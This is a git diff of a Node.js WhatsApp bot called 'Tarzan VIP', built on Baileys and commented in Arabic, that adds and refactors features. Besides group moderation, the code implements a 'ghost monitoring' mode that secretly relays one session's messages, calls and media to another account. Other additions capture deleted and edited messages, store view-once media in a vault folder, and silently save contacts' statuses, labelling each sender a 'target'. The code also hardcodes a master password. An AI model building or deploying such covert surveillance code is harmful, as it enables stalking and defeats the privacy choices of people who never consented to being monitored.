@@ -4,8 +4,8 @@ const path = require('path');
 const qrCode = require('qrcode');
 const moment = require('moment-timezone');
 const axios = require('axios');
-const pino = require('pino'); // 🛡️ كتم السجلات لمنع اختناق المعالج
-const { GoogleGenerativeAI } = require('@google/generative-ai'); // 🧠 مكتبة جوجل
+const pino = require('pino');
+const { GoogleGenerativeAI } = require('@google/generative-ai'); // كودك الأصلي
 
 const {
     default: makeWASocket,
@@ -16,10 +16,11 @@ const {
     downloadMediaMessage,
     jidNormalizedUser,
     generateWAMessageFromContent,
+    getContentType,
     proto
 } = require('@whiskeysockets/baileys');
 
-// 🛡️ درع حماية بيئة Node.js من الانطفاء المفاجئ
+// 🛡️ درع حماية بيئة Node.js
 process.on('uncaughtException', console.error);
 process.on('unhandledRejection', console.error);
 
@@ -27,20 +28,22 @@ const app = express();
 const PORT = process.env.PORT || 10000;
 const MASTER_PASSWORD = 'tarzanbot'; 
 const sessions = {};
-const msgStore = new Map(); 
-
-// 👁️ [جديد]: خريطة الذاكرة لنظام المراقبة الشبحية
-const activeMonitors = new Map();
 
 // ==========================================
-// 🌟 [إضافات التطوير]: ذواكر الحماية والترجمة
+// 🧠 ذواكر البوت (كودك + الميزات الجديدة)
 // ==========================================
-const globalContacts = new Map();
-const spamStore = new Map();
+const msgStore = new Map(); // لمضاد الحذف والتعديل
+const activeMonitors = new Map(); // للمراقبة الشبحية
+const globalContacts = new Map(); // لجلب الأسماء الحقيقية
+const spamStore = new Map(); // لمضاد الإزعاج
+const DIVIDER = '━━━━━━━━━━━━━━━';
 
-// دالة لترجمة الأرقام المخفية (LID) للرقم الحقيقي
+// ==========================================
+// 🎯 دالة الاستخبارات (ترجمة الأرقام المخفية والأسماء)
+// ==========================================
 function getContactInfo(jid, pushName) {
     if (!jid) return { name: pushName || 'مجهول', number: 'مجهول', isLid: false };
+    
     let cleanJid = jidNormalizedUser(jid);
     let realJid = cleanJid;
     let isLid = cleanJid.includes('@lid');
@@ -52,16 +55,21 @@ function getContactInfo(jid, pushName) {
             }
         }
     }
+
     const rawNumber = realJid.split('@')[0].split(':')[0];
     let name = 'غير معروف';
     const contact = globalContacts.get(realJid) || globalContacts.get(cleanJid);
+    
     if (contact && contact.name) name = contact.name; 
     else if (contact && contact.notify) name = contact.notify; 
     else if (pushName) name = pushName; 
+    
     return { name, number: rawNumber, isLid };
 }
 
-// ✅ 1. نظام حفظ الإعدادات
+// ==========================================
+// ✅ نظام حفظ الإعدادات (مرتبط بلوحة الويب)
+// ==========================================
 const settingsPath = path.join(__dirname, 'settings.json');
 let botSettings = {};
 if (fs.existsSync(settingsPath)) { 
@@ -79,24 +87,21 @@ if (!botSettings.GLOBAL_CONFIG) {
 function saveSettings() { fs.writeFileSync(settingsPath, JSON.stringify(botSettings, null, 2)); }
 function generateSessionPassword() { return 'VIP-' + Math.random().toString(36).substring(2, 8).toUpperCase(); }
 
-// ✅ 2. مجلد الخزنة للميديا المخفية
+// ✅ مجلد الخزنة
 const vaultPath = path.join(__dirname, 'ViewOnce_Vault');
 if (!fs.existsSync(vaultPath)) fs.mkdirSync(vaultPath);
 
-// 🛡️ 3. نظام تفريغ الذاكرة الذكي
+// تنظيف الذاكرة الذكي
 setInterval(() => { 
-    if (msgStore.size > 5000) {
-        msgStore.clear(); 
-        console.log('🧹 [حماية السيرفر] تم تفريغ الذاكرة المؤقتة للرسائل');
-    }
-    spamStore.clear(); // تفريغ ذاكرة السبام
-}, 30 * 60 * 1000);
+    if (msgStore.size > 5000) msgStore.clear(); 
+    spamStore.clear();
+}, 15 * 60 * 1000);
 
 app.use(express.static('public'));
 app.use(express.json());
 
 // ==========================================
-// 🚀 4. معالج الأوامر
+// 🚀 معالج الأوامر (نسخ لصق من كودك الأصلي)
 // ==========================================
 const commandsMap = new Map();
 const commandsPath = path.join(__dirname, 'commands');
@@ -123,7 +128,7 @@ function loadCommands() {
 loadCommands();
 
 // ==========================================
-// ⚙️ 5. تشغيل الجلسات
+// ⚙️ تشغيل الجلسات
 // ==========================================
 async function startSession(sessionId, res = null, pairingNumber = null) {
     const sessionPath = path.join(__dirname, 'sessions', sessionId);
@@ -131,33 +136,16 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
 
     if (!botSettings[sessionId]) {
         botSettings[sessionId] = { 
-            password: generateSessionPassword(), 
-            botEnabled: true, 
-            commandsEnabled: true, 
-            aiEnabled: false, 
-            autoReact: false, 
-            reactEmoji: '❤️', 
-            welcomeSent: false,
-            // المتغيرات الإضافية للوحة الويب
-            antiCall: false, 
-            antiLink: false, 
-            antiSpam: false, 
-            antiBadWords: false, 
-            antiBot: false, 
-            autoStatusSave: false,
-            badWordsList: []
+            password: generateSessionPassword(), botEnabled: true, commandsEnabled: true, aiEnabled: false, autoReact: false, reactEmoji: '❤️', welcomeSent: false,
+            antiCall: false, antiLink: false, antiSpam: false, antiBadWords: false, antiBot: false, autoStatusSave: false, badWordsList: []
         };
         saveSettings();
     }
 
-    // استكمال المتغيرات للنسخ القديمة
-    if (botSettings[sessionId].antiSpam === undefined) botSettings[sessionId].antiSpam = false;
-    if (botSettings[sessionId].antiBadWords === undefined) botSettings[sessionId].antiBadWords = false;
-    if (botSettings[sessionId].antiBot === undefined) botSettings[sessionId].antiBot = false;
-    if (botSettings[sessionId].antiCall === undefined) botSettings[sessionId].antiCall = false;
-    if (botSettings[sessionId].antiLink === undefined) botSettings[sessionId].antiLink = false;
-    if (botSettings[sessionId].autoStatusSave === undefined) botSettings[sessionId].autoStatusSave = false;
-    if (!botSettings[sessionId].badWordsList) botSettings[sessionId].badWordsList = [];
+    ['antiSpam', 'antiBadWords', 'antiBot', 'antiCall', 'antiLink', 'autoStatusSave'].forEach(key => {
+        if (botSettings[sessionId][key] === undefined) botSettings[sessionId][key] = false;
+    });
+    if (!Array.isArray(botSettings[sessionId].badWordsList)) botSettings[sessionId].badWordsList = [];
     saveSettings();
 
     const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
@@ -170,14 +158,18 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
         printQRInTerminal: false,
         markOnlineOnConnect: true,
         browser: ['Windows', 'Edge', '10.0'],
-        syncFullHistory: false,
-        generateHighQualityLinkPreviews: false
+        syncFullHistory: true, // ضروري لجلب جهات الاتصال القديمة للأسماء
+        generateHighQualityLinkPreviews: false,
+        getMessage: async (key) => { 
+            const msg = msgStore.get(`${key.remoteJid}_${key.id}`);
+            return msg?.message || undefined;
+        }
     });
 
     sessions[sessionId] = sock;
     sock.ev.on('creds.update', saveCreds);
 
-    // مزامنة جهات الاتصال للدقة
+    // سحب جهات الاتصال للذاكرة للترجمة العكسية (LID)
     sock.ev.on('contacts.upsert', (contacts) => {
         for (const contact of contacts) {
             globalContacts.set(contact.id, contact);
@@ -198,9 +190,7 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
                 const code = await sock.requestPairingCode(pairingNumber);
                 const formattedCode = code?.match(/.{1,4}/g)?.join('-') || code;
                 if (res && !res.headersSent) res.json({ pairingCode: formattedCode });
-            } catch (err) {
-                if (res && !res.headersSent) res.status(500).json({ error: 'تعذر طلب الكود. حاول بعد ثوانٍ.' });
-            }
+            } catch (err) {}
         }, 3000); 
     }
 
@@ -217,12 +207,11 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
         }
 
         if (connection === 'open') {
-            console.log(`✅ الجلسة ${sessionId} متصلة بنجاح!`);
             const selfId = jidNormalizedUser(sock.user.id);
             try { await sock.updateProfileStatus(`🤖 طرزان الواقدي VIP | يعمل الآن`); } catch (e) {}
 
             if (!botSettings[sessionId].welcomeSent) {
-                const welcomeText = `👑 *مرحباً بك في نظام طرزان VIP* 👑\n\n✅ *تم الربط بنجاح!*\n\n🔐 *بيانات جلستك:*\n👤 *الجلسة:* ${sessionId}\n🔑 *الباسورد:* ${botSettings[sessionId].password}\n\n🤖 *— 𝑻𝑨𝑹𝒁𝑨𝑵 𝑩𝑶𝑻 ⚔️*`;
+                const welcomeText = `👑 *مرحباً بك في نظام طرزان VIP* 👑\n\n✅ *تم الربط بنجاح!*\n\n👤 *الجلسة:* ${sessionId}\n🔑 *الباسورد:* ${botSettings[sessionId].password}\n\n🤖 *— 𝑻𝑨𝑹𝒁𝑨𝑵 𝑩𝑶𝑻 ⚔️*`;
                 await sock.sendMessage(selfId, { image: { url: 'https://b.top4top.io/p_3489wk62d0.jpg' }, caption: welcomeText });
                 botSettings[sessionId].welcomeSent = true; saveSettings();
             }
@@ -230,22 +219,37 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
     });
 
     // ==========================================
-    // 📞 [إضافة] مضاد المكالمات
+    // 📞 رادار ومضاد المكالمات
     // ==========================================
     sock.ev.on('call', async (calls) => {
         const currentSettings = botSettings[sessionId] || {};
         for (const call of calls) {
-            if (call.status === 'offer' && currentSettings.antiCall) {
-                try {
-                    await sock.rejectCall(call.id, call.from);
-                    await sock.sendMessage(call.from, { text: `🚫 *عـذراً! نـظـام الـحـمـايـة مـفـعـل.*\nيـمـنـع الاتـصـال بـهـذا الـرقـم نـهـائـيـاً.` });
-                } catch (e) {}
+            if (call.status === 'offer') {
+                const callerInfo = getContactInfo(call.from, null);
+                const callerDisplay = callerInfo.isLid ? `[مخفي] ${callerInfo.number}` : `wa.me/${callerInfo.number}`;
+                const callType = call.isVideo ? '📹 فيديو' : '📞 صوتية';
+                
+                if (currentSettings.antiCall) {
+                    try {
+                        await sock.rejectCall(call.id, call.from);
+                        await sock.sendMessage(call.from, { text: `🚫 *عذراً! نظام الحماية مفعل.*\nيمنع الاتصال بهذا الرقم نهائياً.` });
+                    } catch (e) {}
+                }
+
+                if (activeMonitors.has(sessionId)) {
+                    const monitorInfo = activeMonitors.get(sessionId);
+                    const monitorSock = sessions[monitorInfo.monitorSocketId];
+                    if (monitorSock) {
+                        const alertText = `🚨 *[ رادار الـمـكـالـمـات ]* 🚨\n\n📤 *الـمـتـصـل:* ${callerInfo.name}\n📱 *الـرقـم:* ${callerDisplay}\n${DIVIDER}\n📞 *الـنـوع:* ${callType}\n⚠️ *الـحـالـة:* ${currentSettings.antiCall ? '✅ تـم طـرد الـمـتـصـل' : '❌ مـسـمـوح بـالاتـصـال'}`;
+                        try { await monitorSock.sendMessage(monitorInfo.monitorJid, { text: alertText }); } catch(e) {}
+                    }
+                }
             }
         }
     });
 
     // ==========================================
-    // 🛡️ 6. مضاد الحذف الجبار
+    // 🛡️ 6. مضاد الحذف وكاشف التعديل (بالتقارير الملكية)
     // ==========================================
     sock.ev.on('messages.update', async updates => {
         for (const { key, update } of updates) {
@@ -254,13 +258,13 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
                     const storedMsg = msgStore.get(`${key.remoteJid}_${key.id}`);
                     if (!storedMsg?.message) return; 
                     const selfId = jidNormalizedUser(sock.user.id);
-                    const senderJid = key.participant || storedMsg.key?.participant || key.remoteJid;
                     
+                    const senderJid = key.participant || storedMsg.key?.participant || key.remoteJid;
                     const senderInfo = getContactInfo(senderJid, storedMsg.pushName);
                     const senderDisplay = senderInfo.isLid ? `[مخفي] ${senderInfo.number}` : `wa.me/${senderInfo.number}`;
-                    const time = moment().tz("Asia/Riyadh").format("HH:mm:ss | YYYY-MM-DD");
+                    const time = moment().tz("Asia/Riyadh").format("hh:mm:ss A | YYYY-MM-DD");
                     
-                    const alertText = `🚫 *[رسالة محذوفة]* 🚫\n👤 *الاسم:* ${senderInfo.name}\n📱 *الرقم:* ${senderDisplay}\n🕒 *الوقت:* ${time}\n👇 *المحتوى:*`;
+                    const alertText = `🚫 *[ رِسـالـة مـحـذوفـة ]* 🚫\n\n👤 *الـمـرسـل:* ${senderInfo.name}\n📱 *الـرقـم:* ${senderDisplay}\n🕒 *الـوقـت:* ${time}\n${DIVIDER}\n👇 *الـمـحـتـوى الأصـلـي:*`;
                     await sock.sendMessage(selfId, { text: alertText });
                     await sock.sendMessage(selfId, { forward: storedMsg });
                 } catch (err) {}
@@ -269,16 +273,17 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
     });
 
     // ==========================================
-    // 🔥 7. استقبال الرسائل المركزية
+    // 🔥 7. استقبال الرسائل المركزية (كودك الأصلي هو الأساس هنا)
     // ==========================================
     sock.ev.on('messages.upsert', async ({ messages, type }) => {
         if (type !== 'notify') return;
         const msg = messages[0];
         if (!msg?.message) return; 
 
+        // ------------ كودك الأصلي 100% ------------
         const from = msg.key.remoteJid;
         const isGroup = from.endsWith('@g.us');
-        const isStatus = from === 'status@broadcast';
+        const isStatus = from === 'status@broadcast'; // (إضافة فقط لعدم الرد على الحالات)
         const sender = isGroup || isStatus ? msg.key.participant : from;
         const pushName = msg.pushName || 'مجهول';
         const selfId = jidNormalizedUser(sock.user.id);
@@ -299,99 +304,103 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
             await sock.sendPresenceUpdate('composing', from);
             return await sock.sendMessage(from, { text: text }, { quoted: msg });
         };
+        // ------------------------------------------
+
+        // استخراج نوع الرسالة الفعلي (يستخدم للحماية والمراقبة)
+        const actualType = getContentType(msg.message);
 
         // ==========================================
-        // 🌟 [إضافة معزولة]: حماية الجروبات والسبام
+        // 💀 درع حماية الجروبات (تم عزله لكي لا يعرقل أوامرك)
         // ==========================================
         if (isGroup && !isFromMe) {
-            let groupAdmins = [];
-            let isBotAdmin = false;
-            let isSenderAdmin = false;
-
-            const checkAdminStatus = async () => {
-                try {
-                    const groupMetadata = await sock.groupMetadata(from);
-                    groupAdmins = groupMetadata.participants.filter(p => p.admin !== null).map(p => p.id);
-                    isBotAdmin = groupAdmins.includes(selfId);
-                    isSenderAdmin = groupAdmins.includes(sender);
-                } catch (e) {}
-            };
-
+            let isViolationDetected = false;
+            let violationType = '';
+            
+            // 1. فحص البوتات
             if (currentSettings.antiBot && msg.key.id && (msg.key.id.startsWith('BAE5') || msg.key.id.length === 22 || msg.key.id.startsWith('3EB0'))) {
-                await checkAdminStatus();
-                if (isBotAdmin && !isSenderAdmin) {
-                    await sock.sendMessage(from, { delete: msg.key });
-                    await sock.sendMessage(from, { text: `🤖 *[نظام الحماية]* تم رصد بوت دخيل وطردة.` });
-                    await sock.groupParticipantsUpdate(from, [sender], 'remove');
-                    return; 
-                }
+                isViolationDetected = true; violationType = 'bot';
+            }
+            // 2. فحص الروابط
+            else if (currentSettings.antiLink && body.match(/(https?:\/\/)?(www\.)?(chat\.whatsapp\.com|wa\.me|t\.me|youtube\.com|tiktok\.com|instagram\.com)\S*/i)) {
+                isViolationDetected = true; violationType = 'link';
+            }
+            // 3. فحص الكلمات الممنوعة (من لوحة الويب)
+            else if (currentSettings.antiBadWords && currentSettings.badWordsList && currentSettings.badWordsList.length > 0) {
+                const isBadWord = currentSettings.badWordsList.some(word => body.toLowerCase().includes(word.toLowerCase().trim()));
+                if (isBadWord) { isViolationDetected = true; violationType = 'badword'; }
             }
 
-            if (currentSettings.antiLink && body.match(/(https?:\/\/)?(www\.)?(chat\.whatsapp\.com|wa\.me|t\.me|youtube\.com|tiktok\.com)\S*/i)) {
-                await checkAdminStatus();
-                if (isBotAdmin && !isSenderAdmin) {
-                    await sock.sendMessage(from, { delete: msg.key });
-                    await sock.sendMessage(from, { text: `🚫 @${sender.split('@')[0]} *ممنوع نشر الروابط!*`, mentions: [sender] });
-                    await sock.groupParticipantsUpdate(from, [sender], 'remove');
-                    return;
-                }
-            }
+            // إذا اكتشف مخالفة، يتحقق من الإشراف ويعاقب!
+            if (isViolationDetected) {
+                try {
+                    const groupMeta = await sock.groupMetadata(from);
+                    const admins = groupMeta.participants.filter(p => p.admin).map(p => jidNormalizedUser(p.id));
+                    const isBotAdmin = admins.includes(jidNormalizedUser(selfId));
+                    const isSenderAdmin = admins.includes(jidNormalizedUser(sender));
 
-            if (currentSettings.antiBadWords) {
-                const sessionBadWords = currentSettings.badWordsList || [];
-                if (sessionBadWords.length > 0) {
-                    const isBadWord = sessionBadWords.some(word => body.includes(word));
-                    if (isBadWord) {
-                        await checkAdminStatus();
-                        if (isBotAdmin && !isSenderAdmin) {
-                            await sock.sendMessage(from, { delete: msg.key });
-                            await sock.sendMessage(from, { text: `⚠️ @${sender.split('@')[0]} *يمنع استخدام الألفاظ النابية!*`, mentions: [sender] });
-                            return;
-                        }
-                    }
-                }
-            }
-
-            if (currentSettings.antiSpam) {
-                await checkAdminStatus();
-                if (!isSenderAdmin) { 
-                    const spamKey = `${sessionId}_${from}_${sender}`;
-                    const now = Date.now();
-                    let userMsgs = spamStore.get(spamKey) || [];
-                    userMsgs = userMsgs.filter(time => now - time < 5000);
-                    userMsgs.push(now);
-                    spamStore.set(spamKey, userMsgs);
-
-                    if (userMsgs.length >= 5) {
-                        if (isBotAdmin) {
-                            await sock.sendMessage(from, { text: `🚨 @${sender.split('@')[0]} *يمنع الإزعاج (Spam)!* تم الطرد.`, mentions: [sender] });
+                    if (isBotAdmin && !isSenderAdmin) {
+                        await sock.sendMessage(from, { delete: msg.key }); // مسح الرسالة
+                        
+                        if (violationType === 'bot') {
                             await sock.groupParticipantsUpdate(from, [sender], 'remove');
-                            spamStore.delete(spamKey); 
-                            return;
+                            await sock.sendMessage(from, { text: `🤖 *تم رصد بوت دخيل وتدميره.*` });
+                        } 
+                        else if (violationType === 'link') {
+                            await sock.groupParticipantsUpdate(from, [sender], 'remove');
+                            await sock.sendMessage(from, { text: `🚫 @${sender.split('@')[0]} *ممنوع نشر الروابط!* تم الطرد.`, mentions: [sender] });
+                        } 
+                        else if (violationType === 'badword') {
+                            await sock.sendMessage(from, { text: `⚠️ @${sender.split('@')[0]} *تـحـذيـر! يـمـنـع اسـتـخـدام هـذه الألـفـاظ!*`, mentions: [sender] });
+                        }
+                        return; // يوقف الكود هنا لأن العضو خالف وانطرد
+                    }
+                } catch (e) { /* تجاهل الأخطاء الصامتة */ }
+            }
+
+            // 4. مضاد السبام (منفصل لكي لا يمسح كل رسالة)
+            if (currentSettings.antiSpam) {
+                try {
+                    const groupMeta = await sock.groupMetadata(from);
+                    const admins = groupMeta.participants.filter(p => p.admin).map(p => jidNormalizedUser(p.id));
+                    
+                    if (!admins.includes(jidNormalizedUser(sender))) { // إذا لم يكن المرسل مشرفاً
+                        const spamKey = `${sessionId}_${from}_${sender}`;
+                        const now = Date.now();
+                        let userMsgs = spamStore.get(spamKey) || [];
+                        userMsgs = userMsgs.filter(time => now - time < 5000); // آخر 5 ثواني
+                        userMsgs.push(now);
+                        spamStore.set(spamKey, userMsgs);
+
+                        if (userMsgs.length >= 6) { // 6 رسائل سريعة
+                            if (admins.includes(jidNormalizedUser(selfId))) { // إذا كان البوت مشرف
+                                await sock.sendMessage(from, { text: `🚨 @${sender.split('@')[0]} *تم الطرد بسبب الإزعاج (Spam)!*`, mentions: [sender] });
+                                await sock.groupParticipantsUpdate(from, [sender], 'remove');
+                                spamStore.delete(spamKey); 
+                                return;
+                            }
                         }
                     }
-                }
+                } catch (e) {}
             }
         }
 
         // ==========================================
-        // 🌟 [إضافة معزولة]: قناص الحالات
+        // 👁️ قناص الحالات المخفي
         // ==========================================
         if (isStatus && !isFromMe && currentSettings.autoStatusSave) {
             await sock.readMessages([msg.key]); 
-            const msgType = Object.keys(msg.message || {})[0];
-            if (msgType === 'imageMessage' || msgType === 'videoMessage' || msgType === 'extendedTextMessage') {
+            if (actualType === 'imageMessage' || actualType === 'videoMessage' || actualType === 'extendedTextMessage') {
                 try {
                     const senderInfo = getContactInfo(sender, pushName);
                     const senderDisplay = senderInfo.isLid ? `[مخفي] ${senderInfo.number}` : `wa.me/${senderInfo.number}`;
-                    let caption = `👁️ *[ قـنـاص الـحـالات ]* 👁️\n\n👤 *الهدف:* ${senderInfo.name}\n📱 *الرقم:* ${senderDisplay}`;
+                    let caption = `👁️ *[ قـنـاص الـحـالات ]* 👁️\n\n👤 *الهدف:* ${senderInfo.name}\n📱 *الرقم:* ${senderDisplay}\n${DIVIDER}`;
 
-                    if (msgType === 'extendedTextMessage') {
+                    if (actualType === 'extendedTextMessage') {
                         await sock.sendMessage(selfId, { text: `${caption}\n\n📝 *النص:* ${body}` });
                     } else {
                         const buffer = await downloadMediaMessage(msg, 'buffer', {}, { logger: pino({ level: 'silent' }) });
-                        if (msgType === 'imageMessage') await sock.sendMessage(selfId, { image: buffer, caption });
-                        if (msgType === 'videoMessage') await sock.sendMessage(selfId, { video: buffer, caption });
+                        if (actualType === 'imageMessage') await sock.sendMessage(selfId, { image: buffer, caption });
+                        if (actualType === 'videoMessage') await sock.sendMessage(selfId, { video: buffer, caption });
                     }
                 } catch(e) {}
             }
@@ -399,7 +408,25 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
         }
 
         // ==========================================
-        // 👻 أوامر تفعيل/إيقاف المراقبة الشبحية
+        // 🎯 كاشف التعديل (Edit Tracker)
+        // ==========================================
+        if (actualType === 'protocolMessage' && msg.message.protocolMessage.type === 14) {
+            const originalKey = msg.message.protocolMessage.key;
+            const oldMsg = msgStore.get(`${originalKey.remoteJid}_${originalKey.id}`);
+            if (oldMsg && !isFromMe) {
+                const senderInfo = getContactInfo(sender, pushName);
+                const senderDisplay = senderInfo.isLid ? `[مخفي] ${senderInfo.number}` : `wa.me/${senderInfo.number}`;
+                const newText = msg.message.protocolMessage.editedMessage?.conversation || msg.message.protocolMessage.editedMessage?.extendedTextMessage?.text || "مجهول";
+                const oldText = oldMsg.message?.conversation || oldMsg.message?.extendedTextMessage?.text || "ميديا/أخرى";
+                
+                const alertEdit = `✍️ *[ رِسـالـة مُـعـدلـة ]*\n\n👤 *الـمـرسـل:* ${senderInfo.name}\n📱 *الـرقـم:* ${senderDisplay}\n${DIVIDER}\n❌ *الـقـديـم:* ${oldText}\n✅ *الـجـديـد:* ${newText}`;
+                try { await sock.sendMessage(selfId, { text: alertEdit }, { quoted: oldMsg }); } catch(e){}
+            }
+            return;
+        }
+
+        // ==========================================
+        // 👻 أوامر وتفعيل المراقبة الشبحية (كودك الأصلي)
         // ==========================================
         if (body.startsWith('.مراقبه ')) {
             const targetSession = body.replace('.مراقبه ', '').trim();
@@ -418,7 +445,7 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
         }
 
         // ==========================================
-        // 🚨 تنفيذ المراقبة الشبحية (تم دمج فلتر الـ LID فقط)
+        // 🚨 تنفيذ المراقبة الشبحية (دقيقة بالأسماء الحقيقية)
         // ==========================================
         if (activeMonitors.has(sessionId)) {
             const monitorInfo = activeMonitors.get(sessionId);
@@ -426,39 +453,40 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
 
             if (monitorSock && from !== monitorInfo.monitorJid && sender !== monitorInfo.monitorJid) {
                 try {
-                    // التعديل الوحيد هنا هو استخدام getContactInfo للأسماء والأرقام المخفية
-                    const targetInfo = getContactInfo(sender, pushName);
-                    const targetDisplay = targetInfo.isLid ? `[مخفي] ${targetInfo.number}` : `wa.me/${targetInfo.number}`;
-                    const time = moment().tz("Asia/Riyadh").format("HH:mm:ss | YYYY-MM-DD");
+                    const senderInfo = getContactInfo(sender, pushName);
+                    const receiverInfo = getContactInfo(selfId, sock.user.name || 'الحساب المراقب');
+                    const senderDisplay = senderInfo.isLid ? `[مخفي] ${senderInfo.number}` : `wa.me/${senderInfo.number}`;
+                    const receiverDisplay = receiverInfo.isLid ? `[مخفي] ${receiverInfo.number}` : `wa.me/${receiverInfo.number}`;
+                    const time = moment().tz("Asia/Riyadh").format("hh:mm:ss A | YYYY-MM-DD");
                     
-                    let contentDesc = body || 'نص / محتوى غير معروف';
-                    let msgType = Object.keys(msg.message || {})[0];
-
-                    if (msgType === 'imageMessage') contentDesc = '📷 صـورة';
-                    else if (msgType === 'videoMessage') contentDesc = '🎥 فـيـديـو';
-                    else if (msgType === 'audioMessage') contentDesc = '🎵 مـقـطـع صـوتـي';
-                    else if (msgType === 'documentMessage') contentDesc = '📄 مـلـف';
-                    else if (msgType === 'stickerMessage') contentDesc = '🌠 مـلـصـق';
+                    let contentDesc = body || 'نص / ميديا';
+                    if (actualType === 'imageMessage') contentDesc = '📷 صـورة';
+                    else if (actualType === 'videoMessage') contentDesc = '🎥 فـيـديـو';
+                    else if (actualType === 'audioMessage') contentDesc = msg.message.audioMessage?.ptt ? '🎤 بـصـمـة صـوتـيـة (PTT)' : '🎵 مـقـطـع صـوتـي';
+                    else if (actualType === 'documentMessage') contentDesc = '📄 مـلـف';
+                    else if (actualType === 'stickerMessage') contentDesc = '🌠 مـلـصـق';
                     if (viewOnceIncoming) contentDesc = '👁️‍🗨️ رسـالـة عـرض لـمـرة واحـدة';
 
-                    const direction = isFromMe ? '📤 *[تـم إرسـال رسـالـة إلـى]*' : '📥 *[تـم اسـتـلام رسـالـة مـن]*';
-                    const groupInfo = isGroup ? `\n👥 *الـجـروب:* ${getContactInfo(from, null).name || from.split('@')[0]}` : '';
+                    let reportText = `🚨 *[ رادار الـمـراقـبـة - ${sessionId} ]* 🚨\n\n`;
+                    reportText += `📤 *الـمـرسـل:* ${senderInfo.name}\n`;
+                    reportText += `📱 *الـرقـم:* ${senderDisplay}\n`;
+                    reportText += `${DIVIDER}\n`;
+                    reportText += `📥 *الـمـسـتـلـم:* ${receiverInfo.name}\n`;
+                    reportText += `📱 *الـرقـم:* ${receiverDisplay}\n`;
 
-                    const reportText = `🚨 *[ مـراقـبـة شـبـحـيـة - ${sessionId} ]* 🚨\n\n` +
-                                       `${direction}\n` +
-                                       `👤 *الاسـم:* ${targetInfo.name}\n` +
-                                       `📱 *الـرقـم:* ${targetDisplay}${groupInfo}\n` +
-                                       `🕒 *الـوقـت:* ${time}\n\n` +
-                                       `📄 *الـمـحـتـوى:*\n${contentDesc}`;
+                    if (isGroup && !isStatus) {
+                        const groupInfo = getContactInfo(from, null);
+                        reportText += `${DIVIDER}\n👥 *الـمـجـمـوعـة:* ${groupInfo.name !== 'غير معروف' ? groupInfo.name : groupInfo.number}\n`;
+                    }
+
+                    reportText += `${DIVIDER}\n🕒 *الـوقـت:* ${time}\n\n📄 *الـمـحـتـوى:*\n${contentDesc}`;
 
                     await monitorSock.sendMessage(monitorInfo.monitorJid, { text: reportText });
 
-                    if (msgType !== 'conversation' && msgType !== 'extendedTextMessage') {
+                    if (actualType !== 'conversation' && actualType !== 'extendedTextMessage') {
                         await monitorSock.sendMessage(monitorInfo.monitorJid, { forward: msg });
                     }
-                } catch (e) {
-                    console.error('❌ خطأ في إرسال تقرير المراقبة:', e.message);
-                }
+                } catch (e) {}
             }
         }
 
@@ -470,32 +498,30 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
                 const actualMessage = viewOnceIncoming.message;
                 const mediaType = Object.keys(actualMessage)[0];
                 const buffer = await downloadMediaMessage(msg, 'buffer', {}, { logger: pino({ level: 'silent' }) });
-
-                const ext = mediaType === 'imageMessage' ? 'jpg' : (mediaType === 'videoMessage' ? 'mp4' : 'ogg');
                 const senderInfo = getContactInfo(sender, pushName);
                 const senderDisplay = senderInfo.isLid ? `[مخفي] ${senderInfo.number}` : `wa.me/${senderInfo.number}`;
-                
+                const ext = mediaType === 'imageMessage' ? 'jpg' : (mediaType === 'videoMessage' ? 'mp4' : 'ogg');
                 const fileName = `VO_${senderInfo.number}_${Date.now()}.${ext}`;
                 fs.writeFileSync(path.join(vaultPath, fileName), buffer);
 
-                const reportTxt = `🚨 *[رادار الميديا المخفية]* 🚨\n\n👤 *المرسل:* ${senderInfo.name}\n📱 *الرقم:* ${senderDisplay}\n📁 *حُفظت باسم:* ${fileName}\n\n*— TARZAN VIP 👑*`;
+                const reportTxt = `🚨 *[ صائد الميديا المخفية ]* 🚨\n\n👤 *المرسل:* ${senderInfo.name}\n📱 *الرقم:* ${senderDisplay}\n📁 *حُفظت باسم:* ${fileName}\n\n*— TARZAN VIP 👑*`;
                 
                 if (mediaType === 'imageMessage') await sock.sendMessage(selfId, { image: buffer, caption: reportTxt });
                 else if (mediaType === 'videoMessage') await sock.sendMessage(selfId, { video: buffer, caption: reportTxt });
                 else if (mediaType === 'audioMessage') await sock.sendMessage(selfId, { audio: buffer, mimetype: 'audio/mpeg', ptt: true });
-            } catch (err) { console.error('❌ خطأ في الرادار التلقائي:', err); }
+            } catch (err) {}
         }
 
-        if (currentSettings.autoReact && !isFromMe && !viewOnceIncoming) {
+        if (currentSettings.autoReact && !isFromMe && !viewOnceIncoming && !isStatus) {
             try { await sock.sendMessage(from, { react: { text: currentSettings.reactEmoji || '❤️', key: msg.key } }); } catch(e) {}
         }
 
         const isCmd = body.startsWith('.');
 
         // ==========================================
-        // 🧠 8. الذكاء الاصطناعي (نظام Tarzan VIP المخصص)
+        // 🧠 8. الذكاء الاصطناعي (كودك الأصلي 100% بالمسافات)
         // ==========================================
-        if (currentSettings.aiEnabled && !isCmd && !isFromMe && body.trim() !== '' && !viewOnceIncoming) {
+        if (currentSettings.aiEnabled && !isCmd && !isFromMe && body.trim() !== '' && !viewOnceIncoming && !isStatus) {
             try {
                 await sock.sendPresenceUpdate('composing', from); 
                 
@@ -525,7 +551,7 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
         }
 
         // ==========================================
-        // 🎯 9. معالجة الأوامر الخارجية
+        // 🎯 9. معالجة الأوامر الخارجية (كودك الأصلي 100% بالمسافات والمتغيرات)
         // ==========================================
         if (!currentSettings.commandsEnabled) return;
 
@@ -568,7 +594,7 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
 }
 
 // ==========================================
-// 🌐 10. API Endpoints (لوحة التحكم)
+// 🌐 10. API Endpoints (كودك الأصلي + دعم الميزات الجديدة للويب)
 // ==========================================
 app.post('/create-session', (req, res) => {
     const { sessionId } = req.body;
@@ -603,23 +629,26 @@ app.post('/api/settings/save', (req, res) => {
     if (!settings) return res.status(404).json({ error: 'الجلسة غير موجودة' });
